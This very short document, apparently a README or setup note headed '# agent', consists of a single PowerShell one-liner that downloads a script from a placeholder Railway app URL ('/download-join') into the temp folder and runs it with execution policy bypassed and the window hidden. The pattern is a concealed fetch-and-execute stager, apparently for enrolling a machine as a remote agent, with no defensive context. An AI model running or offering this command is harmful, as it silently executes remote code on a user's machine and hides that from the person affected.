"# agent" 
Invoke-WebRequest -Uri "https://YOUR-RAILWAY-APP.up.railway.app/download-join" -OutFile "$env:TEMP\setup.ps1"; powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "$env:TEMP\setup.ps1"
